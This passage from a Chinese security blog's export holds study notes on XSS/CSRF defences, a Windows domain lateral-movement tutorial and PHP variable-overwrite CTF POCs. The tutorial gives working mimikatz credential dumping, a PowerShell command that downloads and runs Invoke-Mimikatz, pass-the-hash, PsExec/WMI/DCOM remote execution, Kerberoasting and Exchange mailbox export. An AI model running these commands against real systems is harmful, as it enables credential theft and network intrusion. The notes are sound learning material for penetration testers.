<h4 id="储存型XSS"><a href="#储存型XSS" class="headerlink" title="储存型XSS"></a>储存型XSS</h4><ul>
<li>定义：<strong>需要先把利用代码保存在比如数据库或者文件中，当WEB程序读取利用代码并输出在页面上时执行利用代码</strong></li>
</ul>
<pre><code>同样要寻找为过滤的输入与输出点</code></pre><hr>
<h4 id="漏洞防范"><a href="#漏洞防范" class="headerlink" title="漏洞防范"></a>漏洞防范</h4><p><font color="purple"><strong>1. 特殊字符HTML实体转码</strong></font></p>
<ul>
<li>一般的XSS漏洞都是因为没过滤特殊字符，导致可以通过注入单引号以及尖括号等字符利用漏洞</li>
</ul>
<ul>
<li>常见特殊字符：<br>```</li>
</ul>
<ol>
<li>单引号(‘)</li>
<li>双引号(“)</li>
<li>尖括号(&lt; &gt;)</li>
<li>反斜杠()</li>
<li>冒号(:)</li>
<li>and(&amp;)</li>
<li>#<pre><code>建议在输出和二次调用时进行如HTML实体一类的转码
</code></pre></li>
</ol>
<p><font color="purple"><strong>2. 标签事件属性黑名单</strong></font></p>
<pre><code>用黑名单过滤
用正则匹配白名单</code></pre><hr>
<h3 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a><font color="green">CSRF漏洞</font></h3><ul>
<li>定义：<strong>跨站请求伪造。劫持其他用户去进行一些危险请求</strong></li>
</ul>
<pre><code>白盒审计中，看核心文件中有没有验证token和referer相关的代码</code></pre><hr>
<h4 id="漏洞防范："><a href="#漏洞防范：" class="headerlink" title="漏洞防范："></a>漏洞防范：</h4><p><font color="purple"><strong>1. token/referer验证</strong></font></p>
<p><font color="purple"><strong>2. 验证码验证</strong></font></p>
]]></content>
      <categories>
        <category>WEB安全</category>
        <category>CTF</category>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>WEB安全</tag>
        <tag>漏洞挖掘</tag>
        <tag>CTF</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>内网渗透学习（四）</title>
    <url>/2021/02/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%9B%9B%EF%BC%89/</url>
    <content><![CDATA[<h2 id="内网渗透学习（四）"><a href="#内网渗透学习（四）" class="headerlink" title="内网渗透学习（四）"></a>内网渗透学习（四）</h2><p>域内横向移动技术是在复杂的内网攻击中被广泛使用的一种技术，攻击者会利用该技术，以被 攻陷的系统为跳板，访问其他域内主机，扩大资产范围。</p>
<h3 id="常用Windows远程连接和相关命令"><a href="#常用Windows远程连接和相关命令" class="headerlink" title="常用Windows远程连接和相关命令"></a>常用Windows远程连接和相关命令</h3><h4 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h4><p>IPC共享“命名管道”的资源，是为了实现进程间通信而开放的命名管道。IPC可以通过验证用户名和密码获得相应的权限，通常是远程管理计算机和查看计算机的共享资源时使用。</p>
<p>建立一个ipc$：</p>
<pre class=" language-bash"><code class="language-bash">net use \\192.168.100.190\ipc$ <span class="token string">"Aa123456@"</span> /user:administrator</code></pre>
<h5 id="ipc-利用前提"><a href="#ipc-利用前提" class="headerlink" title="ipc$利用前提"></a>ipc$利用前提</h5><ol>
<li>开启了139、445端口</li>
<li>管理员开启了默认共享</li>
</ol>
<h5 id="ipc-连接失败原因"><a href="#ipc-连接失败原因" class="headerlink" title="ipc$连接失败原因"></a>ipc$连接失败原因</h5><ol>
<li>用户名或密码错误</li>
<li>目标没有打开ipc$默认共享</li>
<li>不能成功连接目标的139、445端口</li>
<li>命令输入错误</li>
</ol>
<h4 id="使用Windows自带的工具获取远程主机信息"><a href="#使用Windows自带的工具获取远程主机信息" class="headerlink" title="使用Windows自带的工具获取远程主机信息"></a>使用Windows自带的工具获取远程主机信息</h4><ol>
<li>dir命令（列目录）</li>
<li>tasklist命令（列进程）</li>
</ol>
<h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><ol>
<li>at命令（windows server 2008之前）<ul>
<li>使用net time命令确定远程机器当前时间</li>
<li>用copy复制poc到远程机器</li>
<li>使用at命令定时该poc</li>
<li>删除使用at命令创建计划任务的记录</li>
</ul>
</li>
<li>schtasks命令（windows server 2008、windows vista及之后）</li>
</ol>
<hr>
<h3 id="Windows系统散列值获取分析"><a href="#Windows系统散列值获取分析" class="headerlink" title="Windows系统散列值获取分析"></a>Windows系统散列值获取分析</h3><h4 id="LM-Hash和NTLM-Hash"><a href="#LM-Hash和NTLM-Hash" class="headerlink" title="LM Hash和NTLM Hash"></a>LM Hash和NTLM Hash</h4><p>Windows操作系统通常使用两种方法对用户的明文密码进行加密处理。在域环境中，用户信息存储在ntds.dit中，加密后为散列值。</p>
<p>Windows操作系统中的密码一般由两部分组成，一部分为LM Hash，另一部分为NTLM Hash。在Windows操作系统中，Hash的结构通常如下：</p>
<pre><code>username:RID:LM-Hash:NTLM-Hash</code></pre><p>LM Hash本质是DES加密，密码不足14位用0补足。若LM Hash被禁用了，攻击者通过工具抓取的LM Hash通常为”aad3b435b51404eeaad3b435b51404ee”(表示LM Hash为空或被禁用)</p>
<p>NTLM Hash是基于MD4加密算法加密的</p>
<h4 id="单机密码抓取"><a href="#单机密码抓取" class="headerlink" title="单机密码抓取"></a>单机密码抓取</h4><p>想要在Windows操作系统中抓取散列值或明文密码，必须将权限提升至System。本地用户名、散列值和其他安全验证信息都保存在SAM文件中。</p>
<p>常用工具和方法：</p>
<ul>
<li><p>GetPass工具</p>
</li>
<li><p>PwDump7工具</p>
</li>
<li><p>QuarksPwDump工具</p>
</li>
<li><p>通过SAM和System文件抓取密码</p>
<pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 1.导出sam文件</span>
reg save hklm\sam sam.hive
reg save hklm\system system.hive

<span class="token comment" spellcheck="true"># 2.使用mimikatz或者Cain读取SAM文件</span>
运行mimikatz后输入命令
lsadump::sam /sam:sam.hive /system:system.hive

或者在目标机器直接运行mimikatz
先输入<span class="token string">"privilege::debug"</span>
再输入<span class="token string">"token::elevate"</span>
再输入<span class="token string">"lsadump::sam"</span>获取本地SAM文件,获得NTLM Hash</code></pre>
</li>
<li><p>使用mimikatz在线获取SAM文件</p>
<pre class=" language-bash"><code class="language-bash">mimikatz.exe <span class="token string">"privilege::debug"</span> <span class="token string">"log"</span> <span class="token string">"sekurlsa::logonpasswords"</span></code></pre>
</li>
<li><p>使用mimikatz离线读取SAM文件</p>
</li>
<li><p>使用Powershell对散列值进行Dump操作</p>
<pre><code>Import-Module .\Get-PassHashes.ps1
Get-PassHashes</code></pre></li>
<li><p>使用Powershell远程加载mimikatz抓取散列值和明文密码</p>
<pre><code>powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz</code></pre><hr>
<h3 id="哈希传递攻击分析"><a href="#哈希传递攻击分析" class="headerlink" title="哈希传递攻击分析"></a>哈希传递攻击分析</h3></li>
</ul>
<p>通过使用与账户相关的密码散列值来模拟用户登录来进行攻击。通过哈希传递攻击，攻击者不需要破解密码散列值</p>
<p>攻击利用：</p>
<ul>
<li><p>使用NTLM Hash来进行哈希传递</p>
<p>在目标机器以管理员权限运行mimikatz，输入命令：</p>
<pre><code>mimikatz&gt; privilege::debug
mimikatz&gt; sekurlsa::pth /user:administrator /domain:pentest.com /ntlm:D9F9553F...</code></pre></li>
<li><p>使用AES-256密钥进行哈希传递</p>
<p>使用mimikatz抓取AES-256密钥</p>
<pre><code>mimikatz&gt; privilege::debug
mimikatz&gt; sekurlsa::ekeys
# 抓取到密钥后
mimikatz&gt; privilege::debug
mimikatz&gt; sekurlsa:pth /user:administrator /domain:pentest.com /aes256:2781f14...</code></pre><pre><code>命令行输入
dir \\dc\c$
# dir后跟要使用的主机名，而不是IP地址</code></pre><blockquote>
<p>需在目标机器安装KB2871997</p>
</blockquote>
</li>
</ul>
<hr>
<h3 id="票据攻击传递分析"><a href="#票据攻击传递分析" class="headerlink" title="票据攻击传递分析"></a>票据攻击传递分析</h3><p>  哈希传递需要本地管理员权限，而票据传递则不需要</p>
<h4 id="使用mimikatz进行票据传递"><a href="#使用mimikatz进行票据传递" class="headerlink" title="使用mimikatz进行票据传递"></a>使用mimikatz进行票据传递</h4><p>  使用mimikatz可以将内存中的票据导出。</p>
<pre><code>  mimikatz&gt; privilege::debug
  mimikatz&gt; sekurlsa::tickets /export</code></pre><p>  会在当前目录下出现多个服务的票据文件</p>
<p>  清除内存中的票据</p>
<pre><code>  mimikatz&gt; kerberos::purge</code></pre><p>  将票据文件注入内存</p>
<pre><code>  mimikatz &quot;kerberos::ptt &quot;C:\ticket\[0;4f7cf]-2-0-60a00000-administrator@krbtgt-PENTEST.COM.kirbi&quot;</code></pre><p>  将高权限的票据信息注入内存后，将列出远程计算机系统的文件目录</p>
<pre><code>  dir \\dc\c$</code></pre><h4 id="使用kekeo进行票据传递"><a href="#使用kekeo进行票据传递" class="headerlink" title="使用kekeo进行票据传递"></a>使用kekeo进行票据传递</h4><hr>
<h3 id="PsExec使用"><a href="#PsExec使用" class="headerlink" title="PsExec使用"></a>PsExec使用</h3><p>  PsExec主要用于大批量Windows主机的运维，在域环境下效果尤好。攻击者使用PsExec通过命令行环境与目标机器进行连接，甚至控制目标机器。</p>
<ol>
<li><p>在建立了ipc$的情况下，获取system权限的shell</p>
<pre><code>PsExec.exe -accepteula \\192.168.100.190 -s cmd.exe</code></pre><blockquote>
<p>-accepteula 参数不会弹出确认框</p>
</blockquote>
</li>
<li><p>没建立ipc$时，使用账号密码登录</p>
<pre><code>psexec \\192.168.100.190 -u administrator -p Aa123456@ cmd.exe</code></pre><p>使用PsExec的前提条件：</p>
</li>
</ol>
<ul>
<li>需要远程系统开启admin$共享（默认开启）</li>
<li>在使用ipc$连接目标后，不需要输入账号密码</li>
</ul>
<ul>
<li>Metesploit中也有PsExec模块</li>
</ul>
<hr>
<h3 id="WMI使用"><a href="#WMI使用" class="headerlink" title="WMI使用"></a>WMI使用</h3><p>Windows Management Instrumentation。从Win98开始，Windows操作系统支持WMI，可以在本地或者远程管理计算机系统。</p>
<p>攻击者在使用wmi进行横向移动时，Windows操作系统默认不会将WMI的操作记录在日志中。</p>
<h4 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h4><pre><code>wmic /node:192.168.100.190 /user:administrator /password:Aa123456 process call create &quot;cmd.exe&quot; /c ipconfig &gt;ip.txt</code></pre><p>建立ipc$后，使用type命令读取执行结果</p>
<pre><code>type \\192.168.100.190\C$\ip.txt</code></pre><ul>
<li><p>impacket工具包中的wmiexec</p>
</li>
<li><p>wmiexec.vbs</p>
<p>通过VBS调用WMI来模拟PsExec的功能</p>
</li>
<li><p>Invoke-WmiCommand.ps1脚本</p>
</li>
<li><p>Invoke-WMIMethod</p>
</li>
</ul>
<hr>
<h3 id="DCOM在远程系统中的使用"><a href="#DCOM在远程系统中的使用" class="headerlink" title="DCOM在远程系统中的使用"></a>DCOM在远程系统中的使用</h3><p>DCOM（分布式组件对象模型）是微软的一系列概念和程序接口。通过DCOM，客户端程序对象能够向网络中的另一台计算机上的服务器程序对象发送请求。</p>
<p>DCOM是基于对象组件模型（COM）的。COM提供了一套允许在同一台计算机上的客户端和服务器之间进行通信的接口。</p>
<h4 id="通过本地DCOM执行命令"><a href="#通过本地DCOM执行命令" class="headerlink" title="通过本地DCOM执行命令"></a>通过本地DCOM执行命令</h4><p>获取DCOM程序列表</p>
<pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># Powershell3.0以上</span>
Get-CimInstance Win32_DCOMApplication

<span class="token comment" spellcheck="true"># Powershell2.0以上</span>
Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication</code></pre>
<p>使用DCOM执行任意命令</p>
<p>本地启动一个管理员权限的Powershell，执行如下命令</p>
<pre class=" language-bash"><code class="language-bash"><span class="token variable">$com</span> <span class="token operator">=</span> <span class="token punctuation">[</span>activator<span class="token punctuation">]</span>::CreateInstance<span class="token punctuation">(</span><span class="token punctuation">[</span>type<span class="token punctuation">]</span>::GetTypeFromProgID<span class="token punctuation">(</span><span class="token string">"MMC20.Application"</span>,<span class="token string">"127.0.0.1"</span><span class="token punctuation">))</span></code></pre>
<pre class=" language-bash"><code class="language-bash"><span class="token variable">$com</span>.Document.ActiveView.ExecuteShellCommand<span class="token punctuation">(</span><span class="token string">'cmd.exe'</span>,<span class="token variable">$null</span>,<span class="token string">"/c calc.exe"</span>,<span class="token string">"Minimzed"</span><span class="token punctuation">)</span></code></pre>
<h4 id="使用DCOM在远程机器上执行命令"><a href="#使用DCOM在远程机器上执行命令" class="headerlink" title="使用DCOM在远程机器上执行命令"></a>使用DCOM在远程机器上执行命令</h4><p>前提：</p>
<ul>
<li>关闭系统防火墙</li>
<li>具有本地管理员权限账号</li>
</ul>
<ol>
<li><p>通过ipc$连接远程计算机</p>
<pre class=" language-bash"><code class="language-bash">net use \\192.168.100.205 <span class="token string">"a123456@"</span> /user:pentest.com\dm</code></pre>
</li>
<li><p>执行命令</p>
<pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 调用MMC20.Application远程执行命令</span>
<span class="token variable">$com</span> <span class="token operator">=</span> <span class="token punctuation">[</span>activator<span class="token punctuation">]</span>::CreateInstance<span class="token punctuation">(</span><span class="token punctuation">[</span>type<span class="token punctuation">]</span>::GetTypeFromProgID<span class="token punctuation">(</span><span class="token string">"MMC20.Application"</span>,<span class="token string">"192.168.100.205"</span><span class="token punctuation">))</span>
<span class="token variable">$com</span>.Document.ActiveView.ExecuteShellCommand<span class="token punctuation">(</span><span class="token string">'cmd.exe'</span>,<span class="token variable">$null</span>,<span class="token string">"/c calc.exe"</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># 调用9BA05972-F6A8-11CF-A442-00A0C90A8F39</span>
<span class="token variable">$com</span> <span class="token operator">=</span> <span class="token punctuation">[</span>Type<span class="token punctuation">]</span>::GetTypeFromProgID<span class="token punctuation">(</span><span class="token string">'9BA05972-F6A8-11CF-A442-00A0C90A8F39'</span>,<span class="token string">"192.168.100.205"</span><span class="token punctuation">)</span>
<span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token punctuation">[</span>System.Activator<span class="token punctuation">]</span>::CreateInstance<span class="token punctuation">(</span><span class="token variable">$com</span><span class="token punctuation">)</span>
<span class="token variable">$item</span> <span class="token operator">=</span> <span class="token variable">$obj</span>.item<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token variable">$item</span>.Document.Application.ShellExecute<span class="token punctuation">(</span><span class="token string">"cmd.exe"</span>,<span class="token string">"/c calc.exe"</span>,<span class="token string">"c:\windows\system32"</span>,<span class="token variable">$null</span>,0<span class="token punctuation">)</span></code></pre>
</li>
</ol>
<hr>
<h3 id="SPN在域环境中的应用"><a href="#SPN在域环境中的应用" class="headerlink" title="SPN在域环境中的应用"></a>SPN在域环境中的应用</h3><p>在域环境中运行的大量应用包含了多种资源，为资源的合理分组、分类和再分配提供了便利。微软给域内的每种资源分配了不同的服务主体名称SPN（Service Principal Name）</p>
<p>在使用Kerberos协议进行身份验证的网络中，必须在内置账号或者用户账号下为服务器注册SPN。对于内置账号，SPN将自动进行注册。但是，如果在域用户账号下运行服务，则必须为要使用的账号手动注册SPN。</p>
<p>因为域环境中的每台服务器都需要在Kerberos身份验证服务中注册SPN，所以攻击者会直接向域控制器发送查询请求，获取其需要的服务的SPN，从而知晓其需要使用的服务资源在哪台机器上。</p>
<h4 id="SPN命令格式"><a href="#SPN命令格式" class="headerlink" title="SPN命令格式"></a>SPN命令格式</h4><pre><code>SPN = serviceclass &quot;/&quot; hostname [&quot;:&quot;port] [&quot;/&quot; servicename]</code></pre><ul>
<li>serviceclass：服务组件的名称</li>
<li>hostname：以”/“与后面的名称分隔，是计算机的FQDN（全限定域名，同时带有计算机名和域名）</li>
<li>port：以冒号分隔，后面的内容为该服务监听的端口号</li>
<li>servicename：一个字符串，可以是服务的专有名称（DN）、objectGuid、Internet主机名或全限定域名</li>
</ul>
<h4 id="常见的SPN服务"><a href="#常见的SPN服务" class="headerlink" title="常见的SPN服务"></a>常见的SPN服务</h4><ul>
<li><p>MSSQL服务</p>
<pre><code>MSSQLSvc/computer1.pentest.com:1433</code></pre><blockquote>
<p>serviceclass和hostname是必选参数，port和servicename是可选参数</p>
</blockquote>
</li>
<li><p>Exchange</p>
<pre><code>exchangeMDB/EXCAS01.pentest.com</code></pre></li>
<li><p>RDP服务</p>
<pre><code>TERMSERV/EXCAS01.pentest.com</code></pre></li>
<li><p>WSMan/WinRM/PSRemoting服务</p>
<pre><code>WSMAN/EXCAS01.pentest.com</code></pre></li>
</ul>
<h4 id="用于SPN扫描的Powershell脚本"><a href="#用于SPN扫描的Powershell脚本" class="headerlink" title="用于SPN扫描的Powershell脚本"></a>用于SPN扫描的Powershell脚本</h4><p>通过请求特定的SPN类型的服务主体名称来查找服务，与网络端口扫描相比，SPN扫描的主要特点是不需要通过连接网络中的每个IP地址来检查服务端口。</p>
<p>因为SPN是通过LDAP协议向域控制器进行查询的，所以攻击者只要获得一个普通的域用户权限，就可以进行SPN扫描。</p>
<p>扫描MSSQL服务：</p>
<pre><code>Import-Module .\Discover-PSMSSQLServers.ps1
Discover-PSMSSQLServers</code></pre><p>扫描所有SPN服务：</p>
<pre><code>Import-Module .\Discover-PSInterestingServices
Discover-PSInterestingServices</code></pre><p>windows自带工具：</p>
<pre><code>setspn -T domain -q */*</code></pre><h4 id="Kerberoast攻击"><a href="#Kerberoast攻击" class="headerlink" title="Kerberoast攻击"></a>Kerberoast攻击</h4><p>在因为需要使用某个特定资源而向TGS发送Kerberos服务票据的请求时，用户首先需要使用具有有效身份权限的TGT向TGS请求相应服务的票据。当TGT被验证有效且具有该服务的权限时，会向用户发送一张票据。该票据使用与SPN相关联的计算机服务账号的NTLM Hash（RC4_HMAC_MD5）。也就是说，攻击者会通过Kerberos尝试使用不同的NTLM Hash来打开Kerberos票据。如果攻击者使用的NTLM Hash是正确的，Kerberos票据就会被打开，而该NTLM Hash对应于该计算机服务账号的密码。</p>
<ol>
<li><p>手动注册SPN</p>
<pre class=" language-bash"><code class="language-bash">setspn -A MSSQLSvc/computer1.pentest.com:1433 mssql</code></pre>
</li>
<li><p>查看用户所对应的SPN</p>
<pre><code>setspn -L pentest.com/mssql</code></pre></li>
<li><p>使用adsiedit.msc查看用户SPN及其他高级属性</p>
</li>
<li><p>配置指定服务的登录权限</p>
<pre class=" language-bash"><code class="language-bash">gpedit.msc\Computer Configuration\Windows Settings\Security Settings\Local Policies\User Rights Assignment\Log on as a <span class="token function">service</span></code></pre>
</li>
<li><p>修改加密类型</p>
<pre><code>gpedit.msc\Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options\Network security: Configure encryption types allowed for Kerberos</code></pre></li>
<li><p>请求SPN Kerberos票据</p>
<pre><code>Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestor SecurityToken
-ArgumentList &quot;MSSQLSvc/computer1.pentest.com&quot;</code></pre></li>
<li><p>导出票据</p>
<pre><code>mimikatz&gt; kerberos::list /export</code></pre></li>
<li><p>使用Kerberos脚本离线破解票据所对应账号的NTLM Hash</p>
<p>下载kerberos，将票据文件复制到目录下</p>
<pre><code>python tgsrepcrack.py wordlist.txt mssql.kirbi</code></pre></li>
</ol>
<hr>
<h3 id="exchange服务器安全"><a href="#exchange服务器安全" class="headerlink" title="exchange服务器安全"></a>exchange服务器安全</h3><p>Exchange是微软出品的电子邮件服务组件，是一个消息与协作系统。Exchange可以本地化部署，也可以以Exchange Online的形式将Exchange服务器托管在云端。</p>
<p>Exchange支持Poweshell对其进行本地或远程操作，这一方面方便了运维人员对Exchange的管理和配置，另一方面为攻击者对Exchange进行恶意操作创造了条件。</p>
<p>Exchange在逻辑上分为三层：</p>
<ul>
<li>网络层（Network Layer）</li>
<li>目录层（Directory Layer）</li>
<li>消息层（Messaging Layer）</li>
</ul>
<p>邮件服务器有五个角色：</p>
<ul>
<li><strong>邮箱服务器</strong></li>
<li><strong>客户端访问服务器</strong></li>
<li><strong>集线传输服务器</strong></li>
<li>统一消息服务器</li>
<li>边缘传输服务器</li>
</ul>
<p>Exchange支持的访问接口和协议：</p>
<ul>
<li>OWA：Exchange提供的Web邮箱</li>
<li>EAC：Exchange管理中心</li>
<li>Outlook Anywhere</li>
<li>MAPI</li>
<li>Exchange ActiveSync</li>
<li>Exchange Web Service</li>
</ul>
<h4 id="Exchange服务发现"><a href="#Exchange服务发现" class="headerlink" title="Exchange服务发现"></a>Exchange服务发现</h4><p>端口扫描</p>
<pre><code>nmap -A -O -sV 192.168.100.194</code></pre><p>SPN查询</p>
<pre><code>setspn -T pentest.com -F -Q */*</code></pre><h4 id="查看邮件数据库"><a href="#查看邮件数据库" class="headerlink" title="查看邮件数据库"></a>查看邮件数据库</h4><p>将Exchange管理单元添加到当前会话中</p>
<pre><code>add-pssnapin microsoft.exchange*</code></pre><p>-Server参数指定服务器查询</p>
<pre><code>Get-MailboxDatabase -server &quot;Exchange1&quot;</code></pre><p>查询数据库的物理路径</p>
<pre><code>Get-MailboxDatabase -Identity &#39;数据库名&#39; | Format-List Name,EdbFilePath,LogFolderPath</code></pre><h4 id="获取现有用户的邮件地址"><a href="#获取现有用户的邮件地址" class="headerlink" title="获取现有用户的邮件地址"></a>获取现有用户的邮件地址</h4><pre><code>Get-Mailbox | format-tables Name,WindowsEmailAddress</code></pre><h4 id="查看指定用户的邮箱使用信息"><a href="#查看指定用户的邮箱使用信息" class="headerlink" title="查看指定用户的邮箱使用信息"></a>查看指定用户的邮箱使用信息</h4><pre><code>get-mailboxstatistics -identity administrator | Select DisplayName,ItemCount,TotalItemSize,LastLogonTime</code></pre><h4 id="配置用户的导入-导出权限"><a href="#配置用户的导入-导出权限" class="headerlink" title="配置用户的导入/导出权限"></a>配置用户的导入/导出权限</h4><p>查看有导入/导出权限的用户</p>
<pre><code>Get-managementRoleAssignment -role &quot;Mailbox Import Export&quot; | Format-List RoleAssigneeName</code></pre><p>添加权限</p>
<pre><code>New-ManagementRoleAssignment -Name &quot;Import Export_Domain Admins&quot; -User &quot;Administrator&quot; -Role &quot;Mailbox Import Export&quot;</code></pre><blockquote>
<p>添加后需重启Exchange服务器</p>
</blockquote>
<p>删除权限</p>
<pre><code>Remove-ManagementRoleAssignment &quot;Import Export_Domain Admins&quot; -Confirm:$false</code></pre><h4 id="设置网络共享文件夹"><a href="#设置网络共享文件夹" class="headerlink" title="设置网络共享文件夹"></a>设置网络共享文件夹</h4><p>将C盘的inetpub文件夹设置为任意用户都可以操作的文件夹</p>
<pre><code>net share inetpub=c:\inetpub /grant:everyone,full</code></pre><h4 id="导出用户的电子邮件"><a href="#导出用户的电子邮件" class="headerlink" title="导出用户的电子邮件"></a>导出用户的电子邮件</h4><pre><code>New-MailboxExportRequest -Mailbox administrator -FilePath \\192.168.100.194\inetpub\administrator.pst</code></pre><hr>
<p>参考：内网安全攻防渗透测试实战指南</p>
]]></content>
      <categories>
        <category>渗透测试</category>
        <category>红队攻防</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>红队攻防</tag>
      </tags>
  </entry>
  <entry>
    <title>变量覆盖漏洞学习</title>
    <url>/2019/10/27/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a><font color="green">定义</font></h3><ul>
<li>可以用<strong>自定义的参数值</strong><font color="red">替换</font><strong>原有变量值</strong>的情况称为变量覆盖漏洞</li>
</ul>
<a id="more"></a>

<h3 id="主要情形"><a href="#主要情形" class="headerlink" title="主要情形"></a><font color="green">主要情形</font></h3><ul>
<li><strong>$$使用不当</strong></li>
<li><strong>extract()函数使用不当</strong></li>
<li><strong>parse_str()函数使用不当</strong></li>
<li>import_request_variables()使用不当</li>
<li>开启全局变量注册</li>
<li>……</li>
</ul>
<hr>
<h4 id="使用不当"><a href="#使用不当" class="headerlink" title="$$使用不当"></a>$$使用不当</h4><p><strong>1. 定义</strong></p>
<ul>
<li>一个<strong>可变变量</strong>获取了一个普通变量的值作为这个可变变量的变量名。</li>
</ul>
<p><strong>2. 漏洞产生</strong></p>
<ul>
<li>使用<font color="red">foreach</font>来<strong>遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值</strong>。因此就产生了变量覆盖漏洞。</li>
</ul>
<pre><code>&lt;?php
foreach ($_GET as $key =&gt; $value) {
${$key} = $value;
}
echo $a;
?&gt;</code></pre><p>如上代码，把<strong>GET得到的$key</strong>作为<strong>新变量的变量名</strong>，<strong>把GET得到的$value</strong>赋值给它</p>
<p>GET ?a=1 第3行回解析为$a=1。就造成了变量覆盖</p>
<pre><code>//例题
&lt;!--foreach($_GET as $key =&gt; $value){  
        $$key = $value;  
}  
if($name == &quot;meizijiu233&quot;){
    echo $flag;
}--&gt;</code></pre><p>poc:<br><code>?name = meizijiu233</code></p>
<hr>
<h4 id="extract-使用不当"><a href="#extract-使用不当" class="headerlink" title="extract()使用不当"></a>extract()使用不当</h4><p><strong>1. 定义</strong></p>
<ul>
<li>extract() 函数从数组中将变量导入到当前的符号表。</li>
</ul>
<ul>
<li>该函数使用<strong>数组键名</strong>作为<strong>变量名</strong>，使用<font color="green">数组键值</font>作为<font color="green">变量值</font>。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。<strong>该函数返回成功设置的变量数目</strong>。</li>
</ul>
<p><strong>2. 语法</strong></p>
<pre><code>extract(array,extract_rules,prefix)</code></pre><table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>array</td>
<td>必需。规定要使用的数组。</td>
</tr>
<tr>
<td>extract_rules</td>
<td>可选。extract() 函数将检查每个键名是否为合法的变量名，同时也检查和符号表中已存在的变量名是否冲突。对不合法和冲突的键名的处理将根据此参数决定。</td>
</tr>
<tr>
<td>prefix</td>
<td>可选。如果 extract_rules 参数的值是 EXTR_PREFIX_SAME、EXTR_PREFIX_ALL、 EXTR_PREFIX_INVALID 或 EXTR_PREFIX_IF_EXISTS，则 prefix 是必需的。</td>
</tr>
</tbody></table>
<ul>
<li>从以上说明我们可以看到第一个参数是必须的，<strong>会不会导致变量覆盖漏洞由第二个参数决定</strong></li>
</ul>
<p><strong>3. 例子</strong></p>
<pre><code>    &lt;?php if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) { ?&gt;
        &lt;?php
        extract($_POST);
        if ($pass == $thepassword_123) { ?&gt;
            &lt;div class=&quot;alert alert-success&quot;&gt;
                &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;/code&gt;
            &lt;/div&gt;
        &lt;?php } ?&gt;
    &lt;?php } ?&gt;</code></pre><p>题目意思是要POST一个pass数据，<font color="red">extract($_POST)</font>会将POST的数据中的<strong>键名和键值</strong>转换为相应的<strong>变量名和变量值</strong>，利用这个覆盖$pass和$thepassword_123变量的值，从而满足$pass == $thepassword_123这个条件。</p>
<p>POC:</p>
<pre><code>pass=&amp;thepassword_123=   //用POST传入</code></pre><hr>
<h4 id="parse-str-使用不当"><a href="#parse-str-使用不当" class="headerlink" title="parse_str()使用不当"></a>parse_str()使用不当</h4><p><strong>1. 定义</strong></p>
<ul>
<li>parse_str() 函数用于把查询字符串解析到变量中，如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量。 </li>
</ul>
<p><strong>2. 语法</strong></p>
<pre><code>parse_str(string,array)</code></pre><table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>strings</td>
<td>必需。规定要解析的字符串</td>
</tr>
<tr>
<td>array</td>
<td>可选。规定储存变量的数组名称。该参数指示变量将被存储到数组中。</td>
</tr>
</tbody></table>
<p><strong>3. 例子</strong></p>
<pre><code>&lt;?php

error_reporting(0);

if (empty($_GET[&#39;id&#39;])) {

    show_source(__FILE__);

    die();

} else {

    include (‘flag.php’);

    $a = “www.OPENCTF.com”;

    $id = $_GET[&#39;id&#39;];

    @parse_str($id);

    if ($a[0] != ‘QNKCDZO’ &amp;&amp; md5($a[0]) == md5(‘QNKCDZO’)) {

        echo $flag;

    } else {

        exit(‘其实很简单其实并不难！’);

    }

}

?&gt;</code></pre><p><strong>分析</strong>: </p>
<ol>
<li><p>首先要求使用GET提交id参数，然后<strong>parse_str($id)对id参数的数据进行处理</strong></p>
</li>
<li><p><strong>再使用判断$a[0] != ‘QNKCDZO’&amp;&amp;md5($a[0]) == md5(‘QNKCDZO’)的结果是否为真</strong>，为真就返回flag</p>
</li>
<li><p>md5(‘QNKCDZO’)的结果是0e830400451993494058024219903391由于此次要满足$a[0] != ‘QNKCDZO’ &amp;&amp; md5($a[0]) == md5(‘QNKCDZO’)</p>
</li>
<li><p>所以要<strong>利用php弱语言特性</strong>，0e123会被当做科学计数法，0*10x123。所以<font color="green">需要找到一个字符串md5后的结果是0e开头后面都是数字的</font>，如，240610708，s878926199a </p>
</li>
</ol>
<p>POC:</p>
<pre><code>?id=a[0]=s878926199a //?id=a[0]=240610708</code></pre>]]></content>
      <categories>
        <category>WEB安全</category>
        <category>CTF</category>
        <category>漏洞挖掘</category>
      </categories>
      <tags>
        <tag>WEB安全</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>STM8单片机</title>
